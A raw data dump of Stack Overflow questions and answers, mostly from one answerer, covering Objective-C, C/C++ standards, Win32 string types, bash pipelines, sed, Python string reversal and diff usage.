<pre><code>@implementation MyClass
@synthesize ivar1, ivar2;

NSString* myVar; // &lt;- What is the intent?

- (id)init {

...

@end
</code></pre>

<p>To me the intention appears to be similar to that of a member variable. What are the advantages of declaring a variable in this way instead of using an ivar in the @interface declaration?</p>
","9530","","<p>It's just a plain old global variable.  There's only one instance of it, and it can be accessed by any code within the same file <em>translation unit</em> (the final file you get after running the preprocessor).  Other translation units (that is, other <code>.m</code> files) can also access that global variable, but in order to do so, they need to use an <code>extern</code> statement:</p>

<pre><code>extern NSString *myVar;
</code></pre>

<p><code>extern</code> says ""this is the name of a global variable, but it's defined in a different translation unit"".  The linker resolves all of the <code>extern</code> declarations at link time.</p>
"
"<p>I'm programming an application in Objective-C and I'm getting this error:</p>

<pre><code>MyApp(2121,0xb0185000) malloc: *** error for object 0x1068310: double free
*** set a breakpoint in malloc_error_break to debug
</code></pre>

<p>It is happening when I release an NSAutoreleasePool and I can't figure out what object I'm releasing twice.</p>

<p>How do I set his breakpoint?</p>

<p>Is there a way to know what is this ""object 0x1068310""?</p>

<p>thanks in advance</p>

<p>Gonso</p>
","9530","","<p>Open up the debugger console by pressing Cmd+Shift+R.  There, type</p>

<pre><code>break malloc_error_break
</code></pre>

<p>to set a breakpoint at the beginning of the <code>malloc_error_break</code> function.</p>

<p>If you want to find out what object is located at address 0x1068310, you can type the following into the debugger console:</p>

<pre><code>print-object 0x1068310
</code></pre>

<p>Of course, you have to do this while the object is still alive -- if the object has already been freed by the time you do this, then this will not work.</p>
"
"<p>I am using 'tail -f' to follow a log file as it's updated:</p>

<blockquote>
  <p><strong>tail -f logfile</strong></p>
</blockquote>

<p>I next pipe the output of that to grep to show only the lines containing a search term (""org.springframework"" in this case):</p>

<blockquote>
  <p>tail -f logfile <strong>| grep org.springframework</strong></p>
</blockquote>

<p>The third step I'd like to make is piping the output from grep to a third command, 'cut':</p>

<blockquote>
  <p>tail -f logfile | grep org.springframework <strong>| cut -c 25-</strong></p>
</blockquote>

<p>The cut command would remove the first 25 characters of each line for me <strong>if it could get the input from grep!</strong> (It works as expected if I eliminate 'grep' from the chain.)</p>

<p>I'm using <strong>cygwin</strong> with <strong>bash</strong> if that matters.</p>

<p>Thanks in advance for your assistance, O Mighty Scripting Gods, Ye!</p>

<p>--
LES</p>

<p><strong>Edit:</strong>
Actual results: When I add the second pipe to connect to the 'cut' command, the result is that it hangs, as if it's waiting for input (in case you were wondering).</p>

<p><strong>Edit 2:</strong> Corrected typo in cut command</p>
","9530","","<p>What you have should work fine -- that's the whole idea of pipelines.  The only problem I see is that, in the version of <code>cut</code> I have (GNU coreutiles 6.10), you should use the syntax <code>cut -c 25-</code> (i.e. use a minus sign instead of a plus sign) to remove the first 24 characters.</p>

<p>You're also searching for different patterns in your two examples, in case that's relevant.</p>
"
"<p>Here's a bash script I'm working on:</p>

<pre><code>dir=""~/path/to/$1/folder""

if [ -d ""$dir"" ]; then
    # do some stuff
else
    echo ""Directory $dir doesn't exist"";
    exit 1
fi
</code></pre>

<p>and when I run it from the terminal:</p>

<pre>> ./myscript.sh 123
Directory ~/path/to/123/folder doesn't exist</pre>

<p>But that folder clearly does exist. This works normally:</p>

<pre>> ls ~/path/to/123/folder</pre>

<p>What am I doing wrong?</p>
","9530","","<p>The problem is that bash performs tilde expansion before shell parameter substitution, so after it substitutes <code>~/path/to/folder</code> for <code>$dir</code>, it doesn't try to expand the <code>~</code>, so it looks for a directory literally named with a tilde in it, which of course doesn't exist.  See <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Expansions"" rel=""nofollow"">section 3.5 of the bash manual</a> for a more detailed explanation on bash's expansions.</p>
"
"<p>I'm messing around with image manipulation, mostly using Python.  I'm not too worried about performance right now, as I'm just doing this for fun.  Thus far, I can load bitmaps, merge them (according to some function), and do some REALLY crude analysis (find the brightest/darkest points, that kind of thing).</p>

<p>I'd like to be able to take an image, generate a set of control points (which I can more or less do now), and then smudge the image, starting at a control point and moving in a particular direction.  What I'm not sure of is the process of smudging itself.  What's a good algorithm for this?</p>
","9530","","<p>One method would be to apply a <a href=""http://en.wikipedia.org/wiki/Gaussian%5Fblur"" rel=""nofollow"">Gaussian blur</a> (or some other type of blur) to each point in the region defined by your control points.</p>
"
"<p>Does anyone know how to convert a char array to a LPCTSTR in c?</p>

<p>Edit:</p>

<p>For more reference, I need to add an integer to a string then convert that string to LPCTSTR for the first parameter of the windows function CreateFile().</p>

<p>This is the hardcoded example which I am currently using, but I need to be able to pass in any number to use as a port number.</p>

<pre><code>CreateFile(_T(""\\\\.\\COM11"")... //hardcoded for com port 11
</code></pre>

<p>and here are several things I have tried, which I believe include the following suggestions for the next 2 answers of this post. They don't work unfortunately. If anyone could point out something I've done wrong and could possibly solve my problem, I'd appreciate it.</p>

<p>All of these examples assume that portNum is an int that is already assigned a valid value</p>

<h1>1</h1>

<pre><code>char portName[12] = { 0 };

sprintf_s( portName, sizeof( portName ), ""\\\\.\\COM%i"", portNum );

CreateFile(portName...
</code></pre>

<p>I've also tried #1 with a LPCSTR case for what it's worth...</p>

<h1>2</h1>

<pre><code>LPCSTR SomeFunction(LPCSTR aString) {
    return aString;
}

main() {

char portName[12] = { 0 };
sprintf_s( portName, sizeof( portName ), ""\\\\.\\COM%i"", portNum );

LPCSTR lpPortName = SomeFunction(portName);

CreateFile(lpPortName...
</code></pre>

<h1>3</h1>

<pre><code>const char * portName = """";
sprintf_s( portName, sizeof( portName ), ""\\\\.\\COM%i"", portNum );

LPCSTR lpPortName = portName;

CreateFile(lpPortName...
</code></pre>
","9530","","<p>You can implicitly convert a char array to an <code>LPCSTR</code> without any casts:</p>

<pre><code>void SomeFunction(LPCSTR aString);
...
char myArray[] = ""hello, world!"";
SomeFunction(myArray);
</code></pre>

<p>An <code>LPCSTR</code> is a Windows typedef for a long pointer to a constant string.  Back in the dark days of Win16 programming, there were different types of pointers: <em>near</em> pointers and <em>far</em> pointers, sometimes also known as <em>short</em> and <em>long</em> pointers respectively.  Near pointers could only point to a 64KB segment of memory determined by one of the x86 segment registers.  Far pointers could point to anything.  Nowadays in Win32 with virtual memory, there is no need for near pointers -- all pointers are long.</p>

<p>So, an <code>LPSTR</code> is a typedef for a <code>char *</code>, or pointer to a string.  An <code>LPCSTR</code> is the <code>const</code> version, i.e. it is a typedef for a <code>const char *</code>.  In C, arrays decay into pointers to their first elements, so a <code>char[]</code> decays into a <code>char*</code>.  Finally, any type of ""pointer to T"" (for any type T) can be implicitly converted into a ""pointer to const T"".  Thus, combining these three facts, we see that we can implicitly convert a <code>char[]</code> into an <code>LPCSTR</code>.</p>

<p><hr /></p>

<p>In response to your edit, I'm going to guess that you're compiling a Unicode application.  If you look carefully at the <a href=""http://msdn.microsoft.com/en-us/library/aa363858%28VS.85%29.aspx"">documentation for <code>CreateFile()</code></a>, you'll notice that the filename parameter is actually an <code>LPCTSTR</code>, not an <code>LPCSTR</code> (note the <code>T</code>).</p>

<p>For pretty much every Win32 function that takes an argument of some string type (perhaps indirectly, i.e. as a member of a structure passed as a parameter), there are actually two versions of that function: one which takes 8-bit ANSI strings, and one which takes 16-bit wide-character strings.  To get the actual function names, you append an <code>A</code> or a <code>W</code> to the function name.  So, the ANSI version of <code>CreateFile()</code> is named <code>CreateFileA()</code>, and the wide-character version is named <code>CreateFileW()</code>.  Depending on whether or not you're compiling with Unicode enabled (i.e. whether the preprocessor symbol <code>_UNICODE</code> is defined), the symbol <code>CreateFile</code> is <code>#define</code>d to either <code>CreateFileA</code> or <code>CreateFileW</code> as appropriate, and likewise for every other function that has an ANSI and a wide-character version.</p>

<p>Along the same lines, the type <code>TCHAR</code> is <code>typedef</code>ed to either <code>char</code> or <code>wchar_t</code>, depending on whether Unicode is enabled, and <code>LPCTSTR</code> is <code>typedef</code>ed to a pointer to a <code>const TCHAR</code>.</p>

<p>Thus, to make your code correct, you should replace the strings you're using with <code>TCHAR</code> strings, and use the type-generic version of <code>sprintf_s</code>, <code>_stprintf_s</code>:</p>

<pre><code>TCHAR portName[32];
_stprintf_s(portName, sizeof(portName)/sizeof(TCHAR), _T(""\\\\.\\COM%d""), portNum);
CreateFile(portName, ...);
</code></pre>

<p>Alternatively, you can explicitly use the ANSI or wide-character versions of everything:</p>

<pre><code>// Use ANSI
char portName[32];
sprintf_s(portName, sizeof(portName), ""\\\\.\\COM%d"", portNum);
CreateFileA(portName, ...);

// Use wide-characters
wchar_t portName[32];
swprintf_s(portName, sizeof(portName)/sizeof(wchar_t), L""\\\\.\\COM%d"", portNum);
CreateFileW(portName, ...);
</code></pre>
"
"<p>How can I express 10 milliseconds using timeval?</p>

<p>This is what I have so far:</p>

<pre><code>struct timeval now;
now.tv_usec =10000;
</code></pre>
","9530","","<p>A <code>struct timeval</code> represents a time as a number of seconds (<code>tv_sec</code>) plus a number of microseconds (<code>tv_usec</code>) between 0 and 1,000,000.  Thus, to represent 10 milliseconds, you would use 10,000 microseconds, as you suggested:</p>

<pre><code>struct timeval tv;
tv.tv_sec = 0;
tv.tv_usec = 10000;
</code></pre>
"
"<p>I have a file system path in a NSString, but I need an FSRef for the system call I will be making. What is the best way to create the FSRef?</p>
","9530","","<p>You can use <a href=""http://developer.apple.com/documentation/Carbon/Reference/File%5FManager/Reference/reference.html#//apple%5Fref/c/func/FSPathMakeRef"" rel=""nofollow""><code>FSPathMakeRef()</code></a> to make an <code>FSRef</code> from a UTF-8 C string path, and you can use the <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/UTF8String"" rel=""nofollow""><code>-UTF8String</code></a> method of <code>NSString</code> to get a UTF-8 C string:</p>

<pre><code>FSRef fsref;
Boolean isDirectory;
OSStatus result = FSPathMakeRef([myString UTF8String], &amp;fsref, &amp;isDirectory);
if(result &lt; 0)
    // handle error
// If successful, fsref is valid, and isDirectory is true if the given path
// is a directory.  If you don't care about that, you can instead pass NULL
// for the third argument of FSPathMakeRef()
</code></pre>
"
"<p>I am just wondering if there would be any loss of speed or efficiency if you did something like this:</p>

<pre><code>int i = 0;
while(i &lt; 100)
{
    int var = 4;
    i++;
}
</code></pre>

<p>which declares <code>int var</code> one hundred times.  It seems to me like there would be, but I'm not sure. would it be more practical/faster to do this instead:</p>

<pre><code>int i = 0;
int var;
while(i &lt; 100)
{
    var = 4;
    i++;
}
</code></pre>

<p>or are they the same, speedwise and efficiency-wise?</p>
","9530","","<p>For primitive types and POD types, it makes no difference.  The compiler will allocate the stack space for the variable at the beginning of the function and deallocate it when the function returns in both cases.</p>

<p>For non-POD class types that have non-trivial constructors, it WILL make a difference -- in that case, putting the variable outside the loop will only call the constructor and destructor once and the assignment operator each iteration, whereas putting it inside the loop will call the constructor and destructor for every iteration of the loop.  Depending on what the class' constructor, destructor, and assignment operator do, this may or may not be desirable.</p>
"
"<p>I'm looking for a good, fully featured C++ assert macro for VisualStudio. With features like be able to ignore an assert once or always, to be able to break exactly where the macro gets called (and not inside macro code), and getting a stack trace.</p>

<p>Before I have to hunker down and write one, I figured I'd ask if anyone knows about any available ones out there.</p>

<p>Any suggestions? </p>

<p>Thanks!</p>
","9530","","<p>See <a href=""http://cnicholson.net/2009/02/stupid-c-tricks-adventures-in-assert/"">Charles Nicholson's blog</a> for a good discussion of an <code>assert</code> macro.  His solution breaks the debugger at the faulting line of code (and not inside the failed assertion handler), and he also solves the problem of not getting warnings about unused variables when assertions are disabled without incurring any runtime costs.</p>
"
"<p>I'm trying to compile <a href=""http://www.xmunkki.org/wiki/doku.php?id=projects:lightzpng"" rel=""nofollow"">LightZPng</a> with warnings on level 4. I get a lot of C4127 on lines that are clearly not worthy of this warning. An example:</p>

<pre><code>#define MAX_BITS 15
int values_per_bitlen[ MAX_BITS + 1 ];
for ( int i = 0; i &lt;= MAX_BITS; ++i )    // C4127 is here
    values_per_bitlen[ i ] = 0;
</code></pre>

<p>How can this code be changed to avoid the warning other than #pragma?</p>
","9530","","<p><a href=""http://cnicholson.net/2009/03/stupid-c-tricks-dowhile0-and-c4127/"" rel=""nofollow"">According to Charles Nicholson</a>, Visual Studio 2005 gives this error with the ""<code>do...while(0)</code>"" trick:</p>

<pre><code>#define MULTI_LINE_MACRO \
    do { \
        doSomething(); \
        doSomethingElse(); \
    } while(0)
</code></pre>

<p>If you absolutely must, you can use the <a href=""http://msdn.microsoft.com/en-us/library/d9x1s805.aspx"" rel=""nofollow"">__pragma</a> directive to selectively disable that warning around a particular code fragment.</p>
"
"<p>I am trying to do a search and replace using GREP/Regex</p>

<p>Here is what I am searching for</p>

<pre><code>&lt;div align=""center"" class=""orange-arial-11""&gt;&lt;b&gt;.+&lt;br&gt;
</code></pre>

<p>I want to remove the <code>&lt;b&gt;, &lt;br&gt;</code> tags, and place <code>&lt;h3&gt;</code> tags around what .+ finds.</p>

<p>But I can't get what .+ finds to stay when it does the replace.</p>

<p>For example, I want to find this</p>

<pre><code>&lt;div align=""center"" class=""orange-arial-11""&gt;&lt;b&gt;This is the section I want intact&lt;br&gt;
</code></pre>

<p>to change to this</p>

<pre><code>&lt;div align=""center"" class=""orange-arial-11""&gt;&lt;h3&gt;This is the section I want intact&lt;/h3&gt;
</code></pre>

<p>Any help is appreciated.</p>
","9530","","<p>Use <a href=""http://www.gnu.org/software/sed/"" rel=""nofollow"">sed</a> instead of grep:</p>

<pre><code># Modify the file in-place
sed -i~ 's|\(&lt;div align=""center"" class=""orange-arial-11""&gt;\)&lt;b&gt;\(.\+\)&lt;br&gt;|\1&lt;h3&gt;\2&lt;/h3&gt;|' the-file
</code></pre>
"
"<p>In another question, I just spotted this little pearl of C wisom:</p>

<pre><code>#define for if (false) {} else for
</code></pre>

<p>which caused MSVC to spit out ""constant expression"" warnings for a quite valid statement:</p>

<pre><code>for (int i = 0; i &lt;= 10; i++) {...}
</code></pre>

<p>I understand <em>why</em> MSVC is complaining because it expands to:</p>

<pre><code>if (false) {} else for (int i = 0; i &lt;= 10; i++) {...}
</code></pre>

<p>I just don't understand why the developers would use that little snippet. Anyone have an idea?</p>
","9530","","<p>It's to fix a bug in old versions of Visual Studio (v5.0 and earlier, IIRC).  In the past, Visual Studio had broken scope rules about variables declared inside <code>for</code> statements:</p>

<pre><code>// This compiles in old versions of Visual Studio, but it is in fact INVALID C++
for(int i = 0; ...)
{
    ...
}

for(i = 0; ...)
{

}
</code></pre>

<p>In other words, Visual Studio gives <code>i</code> a scope as if it were declared outside the loop, and it lets you continue using it after the loop is done.  This lead to code such as the above snippet.  In more standards-compliant compilers, <code>i</code> is no longer in scope at the definition of the second <code>for</code> loop, so the compiler issues an error about <code>i</code> being undefined.</p>

<p>To fix this, some people used this macro (or very similar, equivalent macros):</p>

<pre><code>#define for if(0) {} else for
</code></pre>

<p>This changes the <code>for</code> loop into this:</p>

<pre><code>if(0)
{
}
else
    for(int i = 0; ...)
    {
        ...
    }
</code></pre>

<p>This puts the <code>for</code> loop into an extra level of scope, so that any variables declared in the <code>for</code> loop will be out of scope afterwards, regardless of Visual Studio's bug.  This makes sure that the same code compiles correctly consistently in both Visual Studio and standards-compliant compilers, and that incorrect code does not compile correctly consistently.</p>

<p>Also note that if the macro were instead defined as so:</p>

<pre><code>// DO NOT USE
#define for if(1) for
</code></pre>

<p>Then although that would have the same effect for some simple code, it would suddenly cause the following code to be compiled incorrectly:</p>

<pre><code>if(foo)
    for(...)
    {
        ...
    }
else
    doSomething();
</code></pre>

<p>Because if you expand the macro, you get this:</p>

<pre><code>if(foo)
    if(1)
        for(...)
        {
            ...
        }
    else
        doSomething();
</code></pre>

<p>And the <code>else</code> now matches up with the wrong <code>if</code>!  So, the clever use of using <code>if(0) {} else</code> instead of <code>if(1)</code> avoids this problem.</p>

<p>As a final note, <code>#define for if(0) {} else for</code> does not cause infinite recursion, because the preprocessor will not recursively replace the macro which you are currently defining.  It will only do one replacement in this case. </p>
"
"<p>While thinking about software-engineering in general I came across the question why we don't see any improvements in the way we write/document code.</p>

<p>Think about it: There has not been a revolutionary improvement since we've moved from punch cards to text editing. The last improvement I've seen is syntax highlighting and context sensitive help (e.g. Intellisense or ctags). Not something I would call revolutionary.</p>

<p>That makes me wonder: Why is it so? </p>

<p>I'll start with something I miss badly: </p>

<ul>
<li>Lots of my code deals with geometry. 
For documentation describing geometric relationships always ends up in a big heap of hard to read mathematical stuff (due to the lack of proper equation type-setting in ASCII). However, if I could embed a little drawing or scribble into the code everything would be much easier, neater and better to be understood.</li>
</ul>

<p>What can you think up that would make your coding/text editing/documention tasks easier?</p>
","9530","","<p>I'm surprised that nobody has yet mentioned <a href=""http://en.wikipedia.org/wiki/No%5Fsilver%5Fbullet"" rel=""nofollow"">No Silver Bullet</a>.  In 1986 (!), Frederick Brooks predicted that:</p>

<blockquote>
  <p>There is no single development, in either technology or management technique, which by itself promises even one order-of-magnitude [tenfold] improvement within a decade in productivity, in reliability, in simplicity. [...] We cannot expect ever to see two-fold gains every two years.""</p>
</blockquote>

<p>And in 23 years, he's been proven right.  We've come up with a number of things such as syntax highlighting and Intellisense which have improved productivity significantly, but certainly not by an order of magnitude.  As time marches on, we'll continue to make several incremental improvements, but the fact is <em>there is no silver bullet</em>: there's not going to be some magical revelation in the way we write code that will improve productivity by an order of magnitude.</p>
"
"<p>I've never seen that,internally generated?How does it work?</p>

<p>Can check what I meen here:
<a href=""http://issues.apache.org/jira/secure/attachment/12401970/nutch_0.9_OR.patch"" rel=""nofollow"">http://issues.apache.org/jira/secure/attachment/12401970/nutch_0.9_OR.patch</a></p>

<p>search ""java~""</p>

<p>and you can see ""java.old"" there,what's that again?</p>
","9530","","<p>It's probably some cruft leftover from emacs.  With emacs, whenever you save a file, it saves a backup of the previous version of the file, and the backup is named with the original filename with a tilde appended to it.  If this is the case (which you can easily verify by comparing <code>file</code> with <code>file~</code>), then you can safely ignore all of the files named with tildes.</p>
"
"<p>I have seen it asserted several times now that the following code is not allowed by the C++ Standard:</p>

<pre><code>int array[5];
int *array_begin = &amp;array[0];
int *array_end = &amp;array[5];
</code></pre>

<p>Is <code>&amp;array[5]</code> legal C++ code in this context?</p>

<p>I would like an answer with a reference to the Standard if possible.</p>

<p>It would also be interesting to know if it meets the C standard.  And if it isn't standard C++, why was the decision made to treat it differently from <code>array + 5</code> or <code>&amp;array[4] + 1</code>?</p>
","9530","","<p>Yes, it's legal.  From the <a href=""http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf"">C99 draft standard</a>:</p>

<p>§6.5.2.1, paragraph 2:</p>

<blockquote>
  <p>A postfix expression followed by an expression in square brackets <code>[]</code> is a subscripted
  designation of an element of an array object. The definition of the subscript operator <code>[]</code>
  is that <code>E1[E2]</code> is identical to <code>(*((E1)+(E2)))</code>. Because of the conversion rules that
  apply to the binary <code>+</code> operator, if <code>E1</code> is an array object (equivalently, a pointer to the
  initial element of an array object) and <code>E2</code> is an integer, <code>E1[E2]</code> designates the <code>E2</code>-th
  element of <code>E1</code> (counting from zero).</p>
</blockquote>

<p>§6.5.3.2, paragraph 3 (emphasis mine):</p>

<blockquote>
  <p>The unary <code>&amp;</code> operator yields the address of its operand. If the operand has type ‘‘<em>type</em>’’,
  the result has type ‘‘pointer to <em>type</em>’’. If the operand is the result of a unary <code>*</code> operator,
  neither that operator nor the <code>&amp;</code> operator is evaluated and the result is as if both were
  omitted, except that the constraints on the operators still apply and the result is not an
  lvalue. Similarly, <strong>if the operand is the result of a <code>[]</code> operator, neither the &amp; operator nor the unary <code>*</code> that is implied by the <code>[]</code> is evaluated and the result is as if the <code>&amp;</code> operator
  were removed and the <code>[]</code> operator were changed to a <code>+</code> operator</strong>. Otherwise, the result is
  a pointer to the object or function designated by its operand.</p>
</blockquote>

<p>§6.5.6, paragraph 8:</p>

<blockquote>
  <p>When an expression that has integer type is added to or subtracted from a pointer, the
  result has the type of the pointer operand. If the pointer operand points to an element of
  an array object, and the array is large enough, the result points to an element offset from
  the original element such that the difference of the subscripts of the resulting and original
  array elements equals the integer expression. In other words, if the expression <code>P</code> points to
  the <code>i</code>-th element of an array object, the expressions <code>(P)+N</code> (equivalently, <code>N+(P)</code>) and
  <code>(P)-N</code> (where <code>N</code> has the value <code>n</code>) point to, respectively, the <code>i+n</code>-th and <code>i−n</code>-th elements of
  the array object, provided they exist. Moreover, if the expression <code>P</code> points to the last
  element of an array object, the expression <code>(P)+1</code> points one past the last element of the
  array object, and if the expression <code>Q</code> points one past the last element of an array object,
  the expression <code>(Q)-1</code> points to the last element of the array object. If both the pointer
  operand and the result point to elements of the same array object, or one past the last
  element of the array object, the evaluation shall not produce an overflow; otherwise, the
  behavior is undefined. If the result points one past the last element of the array object, it
  shall not be used as the operand of a unary <code>*</code> operator that is evaluated.</p>
</blockquote>

<p>Note that the standard explicitly allows pointers to point one element past the end of the array, <em>provided that they are not dereferenced</em>.  By 6.5.2.1 and 6.5.3.2, the expression <code>&amp;array[5]</code> is equivalent to <code>&amp;*(array + 5)</code>, which is equivalent to <code>(array+5)</code>, which points one past the end of the array.  This does not result in a dereference (by 6.5.3.2), so it is legal.</p>
"
"<p>I'm looking to be able to have the debugger break when it reaches a particular string match. As an example, I might have something like this:</p>

<pre><code>Foo myObj = [self gimmeObj];
</code></pre>

<p><code>myObj</code> might have a property called <code>name</code>. I want the debugger to stop on the assignment when</p>

<pre><code>[myObj.name isEqualToString:@""Bar""];
</code></pre>

<p>How can I set my conditional breakpoint in Xcode to do that?</p>
","9530","","<p>I'm not sure if this will work, but you can try setting a breakpoint at that line of code, open up the debugger console (Cmd+Shift+R), and type</p>

<pre><code>condition N (int)[[myObj name] isEqualToString:@""Bar""]
</code></pre>

<p>Where N is replaced by the number of the breakpoint (an integer).</p>
"
"<p>I have a program on a Windows XP computer on another continent.  If I start it by double-clicking on an associated file, so that it runs the program according to the file-type association, it crashes at a certain point.  If I start it by dragging an associated file to the program icon, it works fine.  If I double-click on the icon and drag the associated file to the window, it works fine.</p>

<p>The guy on site assures me that he's triple-checked the file-type association, and it should be correct.</p>

<p>Assuming that the icon points to the same executable as the registry, what differences would there be in starting the program in these two different ways?  </p>

<p>EDIT:  In response to a comment, the machine I'm having problems on is running in Japanese, while my normal machine is US English.</p>
","9530","","<p>One possible difference is the initial working directory: if you drag a file onto the executable, the initial working directory is set to the directory containing the executable, whereas if you double click the file, the initial working directory is set to some default value independent of where the file or executable is located.</p>

<p>If you want to get consistent behavior in all cases, you can use <a href=""http://msdn.microsoft.com/en-us/library/aa365530%28VS.85%29.aspx"" rel=""nofollow""><code>SetCurrentDirectory()</code></a> to set the current working directory to whatever you want; I recommend the directory containing the executable, which can be found by calling <a href=""http://msdn.microsoft.com/en-us/library/ms683197%28VS.85%29.aspx"" rel=""nofollow""><code>GetModuleFileName(NULL, ...)</code></a> and stripping off the executable name, or by examining <code>argv[0]</code> inside <code>main()</code>.</p>
"
"<p>So I thought that negative numbers, when mod'ed should be put into positive space... I cant get this to happen in objective-c</p>

<p>I expect this:</p>

<pre><code>-1 % 3 = 2
 0 % 3 = 0
 1 % 3 = 1
 2 % 3 = 2
</code></pre>

<p>But get this</p>

<pre><code>-1 % 3 = -1
 0 % 3 = 0
 1 % 3 = 1
 2 % 3 = 2
</code></pre>

<p>Why is this and is there a workaround?</p>
","9530","","<p>In C and Objective-C, the division and modulus operators perform truncation towards zero.  <code>a / b</code> is <code>floor(a / b)</code> if <code>a / b &gt; 0</code>, otherwise it is <code>ceiling(a / b)</code> if <code>a / b &lt; 0</code>.  It is always the case that <code>a == (a / b) * b + (a % b)</code>, unless of course <code>b</code> is 0.  As a consequence, <code>positive % positive == positive</code>, <code>positive % negative == positive</code>, <code>negative % positive == negative</code>, and <code>negative % negative == negative</code> (you can work out the logic for all 4 cases, although it's a little tricky).</p>
"
"<p>How to calculate the entropy of a file? <em>(Or let's just say a bunch of bytes)</em><br />
I have an idea, but I'm not sure that it's mathematically correct.</p>

<p>My idea is the following:</p>

<ul>
<li>Create an array of 256 integers (all zeros).</li>
<li>Traverse through the file and for each of its bytes,<br />
increment the corresponding position in the array.</li>
<li>At the end: Calculate the ""average"" value for the array.</li>
<li>Initialize a counter with zero,<br />
and for each of the array's entries:<br />
add the entry's difference
to ""average"" to the counter.</li>
</ul>

<p>Well, now I'm stuck. How to ""project"" the counter result in such a way
that all results would lie between 0.0 and 1.0? But I'm sure,
the idea is inconsistent anyway...</p>

<p>I hope someone has better and simpler solutions?</p>

<p><em>Note: I need the whole thing to make assumptions on the file's contents:<br />
(plaintext, markup, compressed or some binary, ...)</em></p>
","9530","","<p>There's no such thing as the entropy of a file.  In information theory, the entropy is a function of a <strong>random variable</strong>, not of a fixed data set (well, technically a fixed data set does have an entropy, but that entropy would be 0 — we can regard the data as a random distribution that has only one possible outcome with probability 1).</p>

<p>In order to calculate the entropy, you need a random variable with which to model your file.  The entropy will then be the entropy of the distribution of that random variable.  This entropy will equal the number of bits of information contained in that random variable.</p>
"
"<p>Is it safe to count on <code>int</code>s always being initialized to 0 in Objective-C?</p>

<p>More specifically, when an object with <code>int</code> ivars has been newly instantiated, is it safe to assume that its ivars have value 0?</p>
","9530","","<p>Yes, class instance variables are always initialized to 0 (or <code>nil</code>, <code>NULL</code>, or <code>false</code>, depending on the exact data type).  See the <a href=""http://web.archive.org/web/20111006112529/http://developer.apple.com/library/mac/#/web/20111006132944/http://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocObjectsClasses.html#//apple_ref/doc/uid/TP30001163-CH11-SW1"">Objective-C 2.0 Programming Language</a>:</p>

<blockquote>
  <p>The <code>alloc</code> method dynamically allocates memory for the new object’s instance variables and initializes them all to 0—all, that is, except the <code>isa</code> variable that connects the new instance to its class.</p>
</blockquote>

<hr>

<p><strong>EDIT 2013-05-08</strong><br>
Apple seems to have removed the above document (now linked to The Wayback Machine).  The (currently) active document <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/WorkingwithObjects/WorkingwithObjects.html"">Programming With Objective-C</a> contains a similar citation:</p>

<blockquote>
  <p>The <code>alloc</code> method has one other important task, which is to clear out the memory allocated for the object’s properties by setting them to zero. This avoids the usual problem of memory containing garbage from whatever was stored before, but is not enough to initialize an object completely.</p>
</blockquote>

<hr>

<p>However, this is <em>only</em> true for instance variables of a class; it is also true for POD types declared at global scope:</p>

<pre><code>// At global scope
int a_global_var;  // guaranteed to be 0
NSString *a_global_string;  // guaranteed to be nil
</code></pre>

<p>With one exception, it is <em>not</em> true for local variables, or for data allocated with <code>malloc()</code> or <code>realloc()</code>; it is true for <code>calloc()</code>, since <code>calloc()</code> explicitly zeros out the memory it allocates.</p>

<p>The one exception is that when Automatic Reference Counting (ARC) is enabled, stack pointers to Objective-C objects are implicitly initialized to <code>nil</code>; however, it's still good practice to explicitly initialize them to <code>nil</code>.  From the <a href=""https://developer.apple.com/library/ios/releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html#//apple_ref/doc/uid/TP40011226-CH1-SW5"">Transitioning to to ARC Release Notes</a>:</p>

<blockquote>
  <p>Stack Variables Are Initialized with <code>nil</code></p>
  
  <p>Using ARC, strong, weak, and autoreleasing stack variables are now implicitly initialized with <code>nil</code></p>
</blockquote>

<p>In C++ (and C++ objects being used in Objective-C++), class instance variables are also <em>not</em> zero-initialized.  You must explicitly initialize them in your constructor(s).</p>
"
"<p>What i want to do is record the time of when a button has been pressed. All these times will be stored in an array. The program will then run through the array and look at the time values and then highlight the button states at those particular times during playback.</p>

<p>Hopefully this makes sense, whats the best way to do this?! Thanks in advance.</p>

<p>------------------ MORE DETAIL ------------------</p>

<p>the first thing that came up on my mind was... 'ah ha, timestamp', but then looking into the documentation, in a certain section in the timestamp page somewhere in the paragraph it states the following: </p>

<p>....You should not use it to determine the exact time at which the event occurred but should instead compare it to the timestamp of another acceleration event to determine the elapsed time between the events....</p>

<p>this is not great.. as i am assuming that it will not be accurate when it comes to playback of highlighting the buttons at the exact times of when the user had actually pressed them during record.
Please let me know of what i should use and do.</p>
","9530","","<p>You can use <a href=""http://developer.apple.com/documentation/CoreFoundation/Reference/CFTimeUtils/Reference/reference.html#//apple%5Fref/c/func/CFAbsoluteTimeGetCurrent"" rel=""nofollow""><code>CFAbsoluteTimeGetCurrent()</code></a> to get the current time expressed as the number of seconds (as a <code>double</code> value, so fractional seconds will be there) since January 1, 2001 00:00:00 GMT.</p>

<p>Hence, you should record the value of <code>CFAbsoluteTimeGetCurrent()</code> at some point when your app starts, and then record its value every time a button is pressed.  Then, by subtracting the time the app started from the time the button was pressed gives you the number of seconds the button was pressed since the app started.  You can then play back the button presses at a later time by taking that time delta and adding it to the time when playback started.</p>
"
"<p>I have taken an integer input and tried to reverse it in Python but in vain! I changed it into a string but still I am not able to. Is there any way to reverse it ? Is there any built-in function?</p>

<p>I am not able to convert the integer into a list so not able to apply the reverse function.</p>
","9530","","<p>You can use the slicing operator to reverse a string:</p>

<pre><code>s = ""hello, world""
s = s[::-1]
print s  # prints ""dlrow ,olleh""
</code></pre>

<p>To convert an integer to a string, reverse it, and convert it back to an integer, you can do:</p>

<pre><code>x = 314159
x = int(str(x)[::-1])
print x  # prints 951413
</code></pre>
"
"<p>Is it possible to use the ""diff"" tool without having physical files? Something like this:</p>

<pre><code>diff ""hello"" ""hell""
</code></pre>
","9530","","<p>You can diff standard input with a file by using the special filename <code>-</code>:</p>

<pre><code># diff the contents of the file 'some-file' with the string ""foobar""
echo foobar | diff - some-file
</code></pre>

<p>With bash, you can also use anonymous named pipes (a bit of a misnomer) to diff two pipelines:</p>

<pre><code># diff the string ""foo"" with the string ""baz""
diff &lt;(echo foo) &lt;(echo baz)
</code></pre>

